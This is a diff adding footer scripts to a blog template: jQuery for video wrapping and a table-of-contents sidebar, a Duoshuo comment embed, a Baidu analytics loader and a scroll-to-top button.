+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"dreajaygithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
 </html>
+
